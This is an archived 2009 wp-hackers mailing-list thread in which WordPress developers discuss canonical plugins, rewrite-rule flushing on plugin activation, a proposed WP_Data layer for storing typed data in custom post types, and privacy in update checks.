>> Thanks Pete,  Perfect example of what I was discussing!
>>
>> So I'll ask others here, are these types of things appropriate or not
>> appropriate to add to the core?  My guess is that most people on the list
>> will chorus "that doesn't belong in the core!"  That's not my opinion, but
>> am I wrong?
>>
>> From my perspective it would be much better if there could be one API for
>> plugins to program for these types of things instead of many, especially if
>> there is a need for shared data or layering of functionality.  However, such
>> functionality is a no-mans land for WordPress and it advancement is thus
>> stunted; said functionality doesn't fit in the core by most people's
>> account, "market forces" don't foster its standardized across many plugins
>> and there is nowhere else for it to go.
>> To solve this?  One of:
>>  1.) Start allowing this kind of stuff into the core,
>> 2.) Support this kind of thing in the new canonical plugins, or 3.) Add a
>> 3rd entity, like canonical plugins in that they would be an official list
>> without duplication but for APIs instead of end user functionality.
>>
>> -Mike
>>
>> ___________
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Tue Dec  8 22:49:43 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 8 Dec 2009 16:49:43 -0600
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>
Message-ID: <674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>

On Tue, Dec 8, 2009 at 4:39 PM, Matt Jacob <matt at mattjacob.com> wrote:
> Currently, in my callback that gets attached to
> register_activation_hook(), I'm flushing the rewrite rules via the
> init hook:
>
> ? ?add_action('init', array($this, 'FlushRewriteRules'));
>
> My FlushRewriteRules() function is 2 lines:
>
> ? ?global $wp_rewrite;
> ? ?$wp_rewrite->flush_rules();
>
> In the function that runs every time my plugin is loaded, I'm
> filtering the rewrite_rules_array with this:
>
> ? ?add_filter('rewrite_rules_array', array($this, 'InsertRewriteRules'));
>
> And my InsertRewriteRules() function just returns a union of the new
> rules and the existing rules. Pretty simple, right?
>
> My question, then, is whether I'm doing it wrong. When my plugin is
> activated, do I need to *explicitly* filter rewrite_rules_array and
> *explicitly* call flush_rules() instead of hooking into init? i.e.,
> should my callback for register_activation_hook actually do the work
> itself?

Yes, you need just to call flush_rules() directly in the callback
you've attached to register_activation_hook.  The problem is that when
the plugin is activated and activate_[plugin name] is called, "init"
has already been called.  So attaching a callback to it at that point
will be fruitless.

From mikeschinkel at newclarity.net  Tue Dec  8 22:49:56 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 17:49:56 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<2979bd660912072051u1b6516c3pa458893d94962cb7@mail.gmail.com>
	<D59BC6EA-9013-4F52-9651-2C275C70DC51@newclarity.net>
	<4B1DF025.9050801@mullenweg.com>
	<615469A2-36AA-43D4-B41B-A288156ABB53@newclarity.net>
	<71ddd7490912080436o13a22a90k3e84954ad3970221@mail.gmail.com>
	<A1236D4C-85C1-4075-8B0B-6FA7F9C0D80E@newclarity.net>
	<81d01c0912080857w4d836674y85e19d7be4454e82@mail.gmail.com>
Message-ID: <41B253CC-B7E1-4A28-B25C-1A56EFEA23F2@newclarity.net>

On Dec 8, 2009, at 11:57 AM, Christopher O'Connell wrote:
> We have (and will soon have
> better) custom post types, I think we need to try an encourage people to
> work within this structure to store and manage their data.

Agreed.

> Aren't calendar events pretty much just a custom "event" post type? IMHO,
> we need to encourage people to work with the database that's already there,
> rather than automatically going for creating a new DB. On the other hand,
> it's not the easiest thing in the world to use: in particular, where do you
> store things? The "meta" table seems the obvious place, but then what goes
> into the actual post table? An empty post? A serialization of the data? All
> the data jammed together?

So therein lies the problem.   Before post types one event plugin creates a set of tables and another uses custom fields.

Now with custom post types most will be using custom fields (though not all) but we still have the compatibility problem.  Both plugins use an "event" post type but one plugin uses custom fields called "Start Date" and "Start Time" and another uses "Event Date" and "Event Time."  Now both provide complimentary functionality but because they use incompatible custom fields they can't be used together.  That's the problem a shared baseline events plugin could solve.

> I really, really agree on the shared baseline. There will always be someone
> who wants slightly different baseline functionality, but there's a lot of
> lower level problems that are probably solved tens if not dozens of times.
> If there were "canonical" libraries I would feel much more comfortable using
> them.

Good deal!

> Finally, I want to affirmatively vote against using the word "premium". In
> general usage on the web, premium means "for money", and there are lots of
> "premium" things in the WP community that are for money (and lots of premium
> things outside of the WP community that are for money). Appropriating the
> word premium won't make those things disappear, it will just confuse people.
> I think it makes sense to chose a word that implies the quality, but still
> free. Canonical or Core would be my votes.

Agreed on not using "Premium."

On Dec 8, 2009, at 12:48 PM, Eric Marden wrote:

> On Dec 8, 2009, at 11:57 AM, Christopher O'Connell wrote:
>> Canonical or Core would be my votes
> I voted for Core, since it already has a strong connotation in the community.

Wouldn't "Core" be confused with the current use of "Core?"
Or are you saying "Core Plugins" which mean they ship with "Core?"

On Dec 8, 2009, at 4:29 PM, Aaron D. Campbell wrote:
> I have two plugins like this (MailChimp Framework <http://wordpress.org/extend/plugins/mailchimp-framework/> and PayPal Framework <http://wordpress.org/extend/plugins/paypal-framework/>).  I really don't think they belong in Core, and I'm also not sure they really belong as canonical plugins.  Since they're only really useful to other programmers, I think they're perfectly fine just staying in the wordpress.org repository as a general plugin.

Status quo doesn't solve some very real problems.  First is that I would either not use your framework or I would copy your plugin into mine to keep end users from the complexity of having to install both yours and mine. If two plugins did copy your framework it could result duplicated and potentially mismatched versions at best or in incompatibilities between the two plugins at worst.

And with out them being designated as "canonical" in some way then people are much less likely to find yours and/or have confidence that it will continue to be supported.  Without being canonical if a developer doesn't like exactly how you implemented it they might just go build a competing version and fragment the market thus making it harder for people to understand which to use and possibility even spawning incompatible child plugins.  If yours were canonical then the incentive would be to either learn to live with your approach and/or contribute code to yours to enhance it to be better fit for purpose.


On Dec 8, 2009, at 5:46 PM, Christopher O'Connell wrote:
> Here's the problem with that: If there's not a canonical version, there's
> potential side effects and conflicts. Furthermore, those additional plugins
> have to be sent along with plugins. Then, you potentially end up with
> several plugins, each of which has a different (and potentially conflicting
> version) of the same library. Or, the user has to manually install a bunch
> of libraries. Plugins really need to be able to get their own dependencies,
> possibly prompting the user as to whether they can install the dependency.

What he said. :-)

-Mike


From matt at mattjacob.com  Tue Dec  8 22:51:14 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Tue, 8 Dec 2009 15:51:14 -0700
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com> 
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
Message-ID: <410963320912081451i544f2f33yc83b2e93822afc51@mail.gmail.com>

On Tue, Dec 8, 2009 at 3:49 PM, Austin Matzko <if.website at gmail.com> wrote:
> Yes, you need just to call flush_rules() directly in the callback
> you've attached to register_activation_hook. ?The problem is that when
> the plugin is activated and activate_[plugin name] is called, "init"
> has already been called. ?So attaching a callback to it at that point
> will be fruitless.

OK, that's kind of what I was thinking. Thanks.

Matt

From matt at mattjacob.com  Tue Dec  8 22:52:39 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Tue, 8 Dec 2009 15:52:39 -0700
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com> 
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
Message-ID: <410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com>

On Tue, Dec 8, 2009 at 3:49 PM, Austin Matzko <if.website at gmail.com> wrote:
> Yes, you need just to call flush_rules() directly in the callback
> you've attached to register_activation_hook. ?The problem is that when
> the plugin is activated and activate_[plugin name] is called, "init"
> has already been called. ?So attaching a callback to it at that point
> will be fruitless.

And what about filtering rewrite_rules_array? I assume that also needs
to be done before flushing the rules.

Matt

From if.website at gmail.com  Tue Dec  8 23:03:43 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 8 Dec 2009 17:03:43 -0600
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
	<410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com>
Message-ID: <674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com>

On Tue, Dec 8, 2009 at 4:52 PM, Matt Jacob <matt at mattjacob.com> wrote:
> And what about filtering rewrite_rules_array? I assume that also needs
> to be done before flushing the rules.

Yes, and you'll also need to attach to "init" the callback that sets
up the rules.

So on activation:

- setup your rules
- flush rewrite rules

On init:

- setup your rules

That way your rule changes get used when the rewrite rules are flushed
by another plugin or on the permalinks admin page, etc.

From matt at mattjacob.com  Tue Dec  8 23:17:44 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Tue, 8 Dec 2009 16:17:44 -0700
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com> 
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com> 
	<410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com> 
	<674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com>
Message-ID: <410963320912081517l77fe898esde271574947a1716@mail.gmail.com>

On Tue, Dec 8, 2009 at 4:03 PM, Austin Matzko <if.website at gmail.com> wrote:
> Yes, and you'll also need to attach to "init" the callback that sets
> up the rules.

Is that the 'init' action, or my plugin's init function (the constructor)?

Does that mean that the Codex is wrong, then? It lists plugins_loaded
as coming before init
(http://codex.wordpress.org/Plugin_API/Action_Reference), which is
probably what made me think I could do it this way in the first place.

To further complicate things, the docs for register_activation_hook()
say that the callback passed to that function doesn't have access to
global variables at the point when it's called. Does that include WP
globals like $wp_rewrite?

Matt

From jwriteclub at gmail.com  Tue Dec  8 23:22:04 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 16:22:04 -0700
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
Message-ID: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>

I'm going to break this out into it's own thread, to keep threads with some
semblance of one thread per topic:


>
> Now with custom post types most will be using custom fields (though not
> all) but we still have the compatibility problem.  Both plugins use an
> "event" post type but one plugin uses custom fields called "Start Date" and
> "Start Time" and another uses "Event Date" and "Event Time."  Now both
> provide complimentary functionality but because they use incompatible custom
> fields they can't be used together.  That's the problem a shared baseline
> events plugin could solve.
>

Well, I'll go ahead and throw out on the open list something that I've
already discussed with a couple of people individually -- a way of
abstracting away the actual storage of data using something like object
persistence (don't read too much into the word) on top of the posts table.

In essence, I would very much like to be able to simply define a type (the
following example XML is for show only):

<type name="event">
   <field type="date" required="true" display_name="Date">date</field>
   <field type="string" required="true" maps="title" display_name="Event
Title">title</field>
   <field type="text" maps="body" display_name="Event
Information">info</field>
   <field type="email" required="true" display_name="Even
Coordinator">coordinator</field>
</type>

Imagine a WP_Data class that then functions something like this:

<?php

WP_Data::loadDefinition("event.xml"); // Called once, probably where action
hooks are added, etc

$my_event = WP_Data::new("event");
$my_event->data = strtotime("+1 week");
$my_event->title = "My Event";
$my_event->body = "An awesome event";
$my_event->email = "abc.123";
try {
   $my_event->save();
} catch (WP_Data_Exception e) {
   ; // Caught an exception here because 'abc.123' is not a valid email
address
}
$my_event->email = "abc at 123.com";
try {
   $my_event->save(); // Succeed, because everything is groovy
}
?>

(note that to be PHP4 compliant, we could have *->save() return a boolean
instead of throw an error.)

As I invision this, it would create a new post of type "event" with
post_title="My Event", post_body="An awesome event" and meta fields for the
other values.

There's more consideration's, like, how does searching work? (I'd vote for,
e.g. $my_events = WP_Data::search("event",array(date => "some day"));).

For what it's worth, I have much (but not all) of such a class,
appropriately enough called WP_Data: It's at
http://svn.wp-plugins.org/profiles/trunk/wp-data/. Right now it doesn't
actually save data to the DB, but I'll try to fix it up this week and then
release an example built on it.

Some of the problems with this approach include the fact that my current
implementation requires a sort of late dynamic binding of methods, which
makes debugging . . . interesting (I add new methods to classes after they
are instantiated by intercepting an re-routing function calls). On the
upside, such an implementation allows for opcode caching of the generated
types and for additional methods to be inserted into classes at run time.

But why do we need all this? If data is stored this way, then reading
someone else's data is simply a matter of loading the definition originally
used, and it all "just works".

~ Christopher

P.S. As I've discussed with several people, definitions could be saved as
JSON, or whatever other format suits, I just used XML because the parser was
easy to write.

P.P.S. Here's an actual definition that will run with the posted version of
WP_Data:

<?xml version="1.0"?>
<profile>
  <definition>
    <name>People</name>
    <author>Christopher O'Connell</author>
    <url>http://compu.terlicio.us/</url>
    <version>0.1.0</version>
    <signature></signature>
    <signature_url></signature_url>
  </definition>
  <data>
    <data-element type="string" display="First
Name">first_name</data-element>
    <data-element type="string" display="Last Name">last_name</data-element>
    <data-element type="int" required="true" min="0" max="150"
display="Age">age</data-element>
    <data-element type="email" required="true"
display="E-mail">email</data-element>
  </data>
  <access-control>
    <editing-user>Christopher O'Connell</editing-user>
    <anonymous-edits>false</anonymous-edits>
    <user-can-edit-own>false</user-can-edit-own>
  </access-control>
</profile>

You will note that there is no "maps" parameter in this definition, I've not
yet added that to WP_Data, but I will be soon. Also, ignore the
access-control part, I've decided that such fine grained control is probably
beyond the scope of what makes sense, but for the moment, the code still
wants to see the section. Also, at the moment, I don't check signatures, but
if definitions were kept in wp-plugins, it would be important to sign them,
to prevent an attack vector for code injection (and have WP warn a user if
they are trying to turn an unsigned definition into code).

P.P.P.S: Look at
http://svn.wp-plugins.org/profiles/trunk/wp-data/WPD_Template.php, I
actually create PHP code from the logical definitions, which poses problems
both in regards to does the user have file writes, and also in regards to a
potential code injection vector. On the other hand, it allows opcode caching
to work. In a final implementation, this might better be left as an
"advanced" option.

From if.website at gmail.com  Tue Dec  8 23:28:36 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 8 Dec 2009 17:28:36 -0600
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <410963320912081517l77fe898esde271574947a1716@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
	<410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com>
	<674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com>
	<410963320912081517l77fe898esde271574947a1716@mail.gmail.com>
Message-ID: <674b4a3b0912081528kee7d1d0u61e1265dca50b62b@mail.gmail.com>

On Tue, Dec 8, 2009 at 5:17 PM, Matt Jacob <matt at mattjacob.com> wrote:
> On Tue, Dec 8, 2009 at 4:03 PM, Austin Matzko <if.website at gmail.com> wrote:
>> Yes, and you'll also need to attach to "init" the callback that sets
>> up the rules.
>
> Is that the 'init' action, or my plugin's init function (the constructor)?

Yes, the "init" action.

> Does that mean that the Codex is wrong, then? It lists plugins_loaded
> as coming before init

"plugins_loaded" is not the same as "activate_[plugin filename]".
"plugins_loaded" happens on every load of WP files, when all the
active plugin files are included.

> To further complicate things, the docs for register_activation_hook()
> say that the callback passed to that function doesn't have access to
> global variables at the point when it's called. Does that include WP
> globals like $wp_rewrite?

Yes, you can use WP globals like $wp_rewrite.

Whoever wrote that is saying that normally plugin files are included
in global scope, so if you declare a variable in your plugin file
without explicitly making it a global variable, for all other times
but activation that variable will automatically have global scope. And
declaring variables like that with the hope they're global by default
is not a good idea, anyways.

From mikeschinkel at newclarity.net  Tue Dec  8 23:45:43 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 18:45:43 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
Message-ID: <BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>

On Dec 8, 2009, at 6:22 PM, Christopher O'Connell wrote:
>> Now with custom post types most will be using custom fields (though not
>> all) but we still have the compatibility problem.  Both plugins use an
>> "event" post type but one plugin uses custom fields called "Start Date" and
>> "Start Time" and another uses "Event Date" and "Event Time."  Now both
>> provide complimentary functionality but because they use incompatible custom
>> fields they can't be used together.  That's the problem a shared baseline
>> events plugin could solve.
> Well, I'll go ahead and throw out on the open list something that I've
> already discussed with a couple of people individually -- a way of
> abstracting away the actual storage of data using something like object
> persistence (don't read too much into the word) on top of the posts table.
> 
> In essence, I would very much like to be able to simply define a type (the
> following example XML is for show only):...

Without commenting on the worth of the idea (because I haven't considered how it would work in all scenarios yet) I will say that the idea is orthogonal to the problem of mismatched names across plugins.  Using the approach you propose we'll still have the problem where one plugin called a data item "Start Date" and another calls it "Event Date."  

Yes those two data elements can live in harmony with each other (that's no different from custom fields that are already in WordPress) but that still doesn't allow the two plugins to work together by sharing data. Until they somehow agree that an event's starting date is  named either "Start Date" or "Event Date" then they will be incompatibility and the sum won't be greater than the parts.

That said, I've got no input at the moment on the rest of the proposal.  Still pondering it.

-Mike

From will at willnorris.com  Wed Dec  9 00:49:51 2009
From: will at willnorris.com (Will Norris)
Date: Tue, 8 Dec 2009 16:49:51 -0800
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <4B1DF4C5.8050306@mullenweg.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
Message-ID: <FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>


On Dec 7, 2009, at 10:40 PM, Matt Mullenweg wrote:

> On 2009-12-06 10:33 PM, Lynne Pope wrote:
>> The reason it was hacked was that the owner didn't know of an update that
>> would have protected his site. The reason he didn't know was because he was
>> using plugins to prevent update checks - and was only using those because he
>> didn't want to send his site URL to WordPress. (Ok, he would have known if
>> he had been keeping track of updates externally, but this is a case where
>> privacy concerns removed an important feature from WordPress and
>> disadvantaged him in the process).
> 
> One would imagine if you install a "disable update check" plugin you'd be conscious of the responsibility of checking for updates manually.
> 
> Even with updates on many people don't update, unfortunately.
> 
> There was a different plugin that just hashed the URL but still checked for updates, which we recommended for the paranoid.
> 
> All in all though, not a high priority. I've never met anyone in person who disables update checks.* (Maybe they're scared to come to WordCamps.)
> 
> * I have met people who disabled it for clients whose sites they managed and were responsible for.


It seems like lines are getting crossed (or perhaps I'm mis-reading some of these)... Lynne isn't asking for, nor advocating, disabling of update checks.  Everyone in the community agrees that updates are vitally important for security.  Lynne's point is that many of the people who disable updates or not doing it because they don't want the security.  They do it because it's the only way they know to prevent identifying data from being sent to wordpress.org.  

I can't help but think of a lot of software I have on my Mac... the first time I run it, it pops up with a little window asking if I want to check for updates automatically (thanks Sparkle.framework).  And a number of them have an additional checkbox to "send additional system data", or whatever the language is.  These are two different things... turning on updates which *everyone* should do, and providing additional statistical data if you wish to.

I understand that there is a privacy policy which covers how the data can and cannot be used.  And yes, I do agree that it covers the data in question here, and there are methods of discovering the data by other means anyway (like the IP address).  But to ask "why so paranoid?" is placing the burden on the wrong party.  Privacy should be the status quo.  The right question is "why does WordPress.org need the data?"  (that's rhetorical, I understand the stats and stuff you do with the data).

If Automattic, the company, wants to require certain data to be provided to use various services like IntenseDebate or PollDaddy, that's fine... those are company products.  But as long as WordPress is a community effort, I would strongly vote +1 to adding options in WordPress core to prevent unnecessary identifying data from being sent during software update checks.  Besides, that privacy page is looking really lonely withe the sole "Blog Visibility" option.

-will

From jwriteclub at gmail.com  Wed Dec  9 01:11:11 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 18:11:11 -0700
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com> 
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
Message-ID: <81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>

Well, that's more or less where the canonical plugins come in: If each
canonical plugin adheres to a specification for storing data (whether it is
what I have proposed or something else) than other plugins could access the
data of canonical plugins quite simply.

The advantage of my proposed solution is that other plugins simply need to
load the definition file from a canonical plugin (presumably somewhere in
wp-plugins) in order to access that data.

Indeed I might go so far as to suggest that part of the requirements for
canonical plugins is that those that store data do so in some consistent
fashion.

~ Christopher

On Tue, Dec 8, 2009 at 4:45 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Dec 8, 2009, at 6:22 PM, Christopher O'Connell wrote:
> >> Now with custom post types most will be using custom fields (though not
> >> all) but we still have the compatibility problem.  Both plugins use an
> >> "event" post type but one plugin uses custom fields called "Start Date"
> and
> >> "Start Time" and another uses "Event Date" and "Event Time."  Now both
> >> provide complimentary functionality but because they use incompatible
> custom
> >> fields they can't be used together.  That's the problem a shared
> baseline
> >> events plugin could solve.
> > Well, I'll go ahead and throw out on the open list something that I've
> > already discussed with a couple of people individually -- a way of
> > abstracting away the actual storage of data using something like object
> > persistence (don't read too much into the word) on top of the posts
> table.
> >
> > In essence, I would very much like to be able to simply define a type
> (the
> > following example XML is for show only):...
>
> Without commenting on the worth of the idea (because I haven't considered
> how it would work in all scenarios yet) I will say that the idea is
> orthogonal to the problem of mismatched names across plugins.  Using the
> approach you propose we'll still have the problem where one plugin called a
> data item "Start Date" and another calls it "Event Date."
>
> Yes those two data elements can live in harmony with each other (that's no
> different from custom fields that are already in WordPress) but that still
> doesn't allow the two plugins to work together by sharing data. Until they
> somehow agree that an event's starting date is  named either "Start Date" or
> "Event Date" then they will be incompatibility and the sum won't be greater
> than the parts.
>
> That said, I've got no input at the moment on the rest of the proposal.
>  Still pondering it.
>
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jwriteclub at gmail.com  Wed Dec  9 01:20:24 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 18:20:24 -0700
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
Message-ID: <81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>

At the risk of being added to the tinfoil hat brigade I have always found it
very unsettling that users are not offered an opt out.

As others have pointed out, virtually every piece of software with a phone
home feature asks for user permission first. Indeed, I suspect (although I
am not fully up to date on case law) that this has been mandated by the
deliciously silly wranglings of the legal community (otherwise, why would
everyone do it?).

But purely from an ethical standpoint, I really think it's important that
users be allowed to opt out easily and in the core!

~ Christopher

On Tue, Dec 8, 2009 at 5:49 PM, Will Norris <will at willnorris.com> wrote:

>
> On Dec 7, 2009, at 10:40 PM, Matt Mullenweg wrote:
>
> > On 2009-12-06 10:33 PM, Lynne Pope wrote:
> >> The reason it was hacked was that the owner didn't know of an update
> that
> >> would have protected his site. The reason he didn't know was because he
> was
> >> using plugins to prevent update checks - and was only using those
> because he
> >> didn't want to send his site URL to WordPress. (Ok, he would have known
> if
> >> he had been keeping track of updates externally, but this is a case
> where
> >> privacy concerns removed an important feature from WordPress and
> >> disadvantaged him in the process).
> >
> > One would imagine if you install a "disable update check" plugin you'd be
> conscious of the responsibility of checking for updates manually.
> >
> > Even with updates on many people don't update, unfortunately.
> >
> > There was a different plugin that just hashed the URL but still checked
> for updates, which we recommended for the paranoid.
> >
> > All in all though, not a high priority. I've never met anyone in person
> who disables update checks.* (Maybe they're scared to come to WordCamps.)
> >
> > * I have met people who disabled it for clients whose sites they managed
> and were responsible for.
>
>
> It seems like lines are getting crossed (or perhaps I'm mis-reading some of
> these)... Lynne isn't asking for, nor advocating, disabling of update
> checks.  Everyone in the community agrees that updates are vitally important
> for security.  Lynne's point is that many of the people who disable updates
> or not doing it because they don't want the security.  They do it because
> it's the only way they know to prevent identifying data from being sent to
> wordpress.org.
>
> I can't help but think of a lot of software I have on my Mac... the first
> time I run it, it pops up with a little window asking if I want to check for
> updates automatically (thanks Sparkle.framework).  And a number of them have
> an additional checkbox to "send additional system data", or whatever the
> language is.  These are two different things... turning on updates which
> *everyone* should do, and providing additional statistical data if you wish
> to.
>
> I understand that there is a privacy policy which covers how the data can
> and cannot be used.  And yes, I do agree that it covers the data in question
> here, and there are methods of discovering the data by other means anyway
> (like the IP address).  But to ask "why so paranoid?" is placing the burden
> on the wrong party.  Privacy should be the status quo.  The right question
> is "why does WordPress.org need the data?"  (that's rhetorical, I understand
> the stats and stuff you do with the data).
>
> If Automattic, the company, wants to require certain data to be provided to
> use various services like IntenseDebate or PollDaddy, that's fine... those
> are company products.  But as long as WordPress is a community effort, I
> would strongly vote +1 to adding options in WordPress core to prevent
> unnecessary identifying data from being sent during software update checks.
>  Besides, that privacy page is looking really lonely withe the sole "Blog
> Visibility" option.
>
> -will
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Wed Dec  9 04:33:29 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 8 Dec 2009 23:33:29 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com>
Message-ID: <230049E3-56CD-4951-9288-24040A235770@newclarity.net>

On Dec 8, 2009, at 8:11 PM, Christopher O'Connell wrote:
> Well, that's more or less where the canonical plugins come in: If each
> canonical plugin adheres to a specification for storing data (whether it is
> what I have proposed or something else) than other plugins could access the
> data of canonical plugins quite simply.

Exactly (assuming you mean that they agree on attribute naming as well as storage methodology, right?)

> The advantage of my proposed solution is that other plugins simply need to
> load the definition file from a canonical plugin (presumably somewhere in
> wp-plugins) in order to access that data.

Somewhere you'll need to map to a common name, though.  It's a chicken-and-egg problem (and one of the reasons that I have a big problem with the hypermedia constraint in the REST architecture, the one constraint that practically everyone ignores. But I digress.)


> Indeed I might go so far as to suggest that part of the requirements for
> canonical plugins is that those that store data do so in some consistent
> fashion.

+1, of course (again, assuming we mean the same thing.)

-Mike

From jwriteclub at gmail.com  Wed Dec  9 05:08:04 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 8 Dec 2009 22:08:04 -0700
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <230049E3-56CD-4951-9288-24040A235770@newclarity.net>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com> 
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<81d01c0912081711i28cd7839h610bc3712f76034c@mail.gmail.com> 
	<230049E3-56CD-4951-9288-24040A235770@newclarity.net>
Message-ID: <81d01c0912082108n467a7b79oa11af2367b75eda9@mail.gmail.com>

Actually,

(without getting too O/T on hypermedia), it does constrain it. Consider, if
each document contains a URL (or a signing url), then this uniquely
identifies the document.

Then, the canonical data definitions are those stored in wp-plugins in
canonical plugins.

Anyone else have any thoughts? Want to see the bacon? Think I've been off my
meds for too long?

~ Christopher

On Tue, Dec 8, 2009 at 9:33 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Dec 8, 2009, at 8:11 PM, Christopher O'Connell wrote:
> > Well, that's more or less where the canonical plugins come in: If each
> > canonical plugin adheres to a specification for storing data (whether it
> is
> > what I have proposed or something else) than other plugins could access
> the
> > data of canonical plugins quite simply.
>
> Exactly (assuming you mean that they agree on attribute naming as well as
> storage methodology, right?)
>
> > The advantage of my proposed solution is that other plugins simply need
> to
> > load the definition file from a canonical plugin (presumably somewhere in
> > wp-plugins) in order to access that data.
>
> Somewhere you'll need to map to a common name, though.  It's a
> chicken-and-egg problem (and one of the reasons that I have a big problem
> with the hypermedia constraint in the REST architecture, the one constraint
> that practically everyone ignores. But I digress.)
>
>
> > Indeed I might go so far as to suggest that part of the requirements for
> > canonical plugins is that those that store data do so in some consistent
> > fashion.
>
> +1, of course (again, assuming we mean the same thing.)
>
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

